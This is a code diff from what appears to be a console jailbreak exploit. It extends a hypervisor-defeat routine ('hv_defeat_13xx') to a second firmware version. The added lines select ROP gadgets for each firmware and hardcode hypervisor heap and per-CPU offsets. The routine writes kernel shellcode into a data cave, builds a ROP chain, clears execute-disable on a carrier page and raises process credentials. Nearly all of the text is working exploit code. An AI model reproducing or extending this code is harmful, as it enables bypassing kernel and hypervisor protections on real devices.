@@ -9,9 +9,9 @@
 #include <unistd.h>
 
 #define KH_POP_RSP_1360 0x291C42
-#define CARRIER_PA_1360 0x3FFFF000
-#define HV_HEAP_OFFSET_1360 0x83028
-#define HV_PCPUS_OFFSET_1360 0x82A60
+#define CARRIER_PA 0x3FFFF000
+#define HV_HEAP_POINTER_OFFSET 0x83028
+#define HV_PCPUS_POINTER_OFFSET 0x82A60
 
 static int kernel_read(uint64_t address, void *buffer, size_t length) {
   return kernel_copyout((intptr_t)address, buffer, length);
@@ -32,7 +32,8 @@ uint64_t kgadget(kgadget_t gadget) {
     offset = env_offset.GAD_IRETQ;
     break;
   case KERNEL_GADGET_POP_RAX:
-    offset = env_offset.GAD_RET_TRAMP - 1;
+    offset = fw == 0x1360 ? env_offset.GAD_RET_TRAMP - 1
+                          : env_offset.GAD_POP_RAX_RET;
     break;
   case KERNEL_GADGET_POP_RCX:
     offset = env_offset.GAD_POP_RCX_RET;
@@ -50,7 +51,7 @@ uint64_t kgadget(kgadget_t gadget) {
     offset = env_offset.GAD_POP_R8_RET;
     break;
   case KERNEL_GADGET_POP_RSP:
-    offset = KH_POP_RSP_1360;
+    offset = fw == 0x1360 ? KH_POP_RSP_1360 : env_offset.GAD_POP_RSP_RET;
     break;
   case KERNEL_GADGET_STORE_RCX_R8:
     offset = env_offset.GAD_STORE_RCX_R8_RET;
@@ -92,10 +93,13 @@ uint64_t kgadget(kgadget_t gadget) {
     return 0;
   }
 
-  return ktext + offset;
+  return offset ? ktext + offset : 0;
 }
 
 static int offsets_present(void) {
+  if (fw != 0x1320 && fw != 0x1360)
+    return 0;
+
   const uint64_t required[] = {
       env_offset.ACPIGBL_FACS,
       env_offset.IDT,
@@ -324,7 +328,6 @@ static int pin_to_core_reborn(int core) {
   cpusetid_t cpuset_id;
   uint64_t cpuset_affinity[2] = {0xFFFF, 0};
   uint64_t affinity[2];
-
   if (core < 0 || core >= 16)
     return -1;
   if (cpuset(&cpuset_id))
@@ -342,8 +345,10 @@ static int install_startup_hook(uint64_t hv_base) {
   kh_chain_t chain;
   uint8_t chain_buffer[0x800];
   uint64_t data_cave = ktext + env_offset.DATA_CAVE;
-  uint64_t carrier = dmap + CARRIER_PA_1360;
+  uint64_t carrier = dmap + CARRIER_PA;
   uint64_t oracle;
+  uint64_t heap_pointer_slot = hv_base + HV_HEAP_POINTER_OFFSET;
+  uint64_t pcpus_pointer_slot = hv_base + HV_PCPUS_POINTER_OFFSET;
   int result;
 
   if (kernel_write(data_cave + 0x1000, stock_shellcode_ap_1360,
@@ -371,10 +376,8 @@ static int install_startup_hook(uint64_t hv_base) {
   kh_chain_store(&chain, carrier + 0xF08, dmap);
   kh_chain_store(&chain, carrier + 0xF10, oracle);
   kh_chain_store(&chain, carrier + 0xF18, hv_base);
-  kh_chain_store(&chain, carrier + 0xF20,
-                 hv_base + HV_HEAP_OFFSET_1360);
-  kh_chain_store(&chain, carrier + 0xF28,
-                 hv_base + HV_PCPUS_OFFSET_1360);
+  kh_chain_store(&chain, carrier + 0xF20, heap_pointer_slot);
+  kh_chain_store(&chain, carrier + 0xF28, pcpus_pointer_slot);
   kh_chain_store(&chain, carrier + 0xF30, 1);
 
   if (chain.err || clear_execute_disable(carrier))
@@ -396,33 +399,37 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
   uint64_t waking_vector;
   int result;
 
-  if (fw != 0x1360 || !shellcode_kernel || !shellcode_kernel_len ||
-      !offsets_present()) {
-    notify("13.60 offsets incomplete\n");
+  if ((fw != 0x1320 && fw != 0x1360) || !shellcode_kernel ||
+      !shellcode_kernel_len || !offsets_present()) {
+    if (fw == 0x1360)
+      notify("13.60 offsets incomplete\n");
     return -1;
   }
 
   if (check_nvs_signature()) {
-    notify("13.60 firmware signature check failed\n");
+    if (fw == 0x1360)
+      notify("13.60 firmware signature check failed\n");
     return -1;
   }
 
   hv_base = derive_h();
   if (!hv_base) {
-    notify("13.60 hypervisor base was not found\n");
+    if (fw == 0x1360)
+      notify("13.60 hypervisor base was not found\n");
     return -1;
   }
 
   kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);
   result = pin_to_core_reborn(0);
   if (result) {
-    notify("13.60 core pin failed (%d)\n", result);
+    if (fw == 0x1360)
+      notify("13.60 core pin failed (%d)\n", result);
     return -1;
   }
-
   result = install_startup_hook(hv_base);
   if (result) {
-    notify("13.60 startup hook failed (%d)\n", result);
+    if (fw == 0x1360)
+      notify("13.60 startup hook failed (%d)\n", result);
     return -1;
   }
 
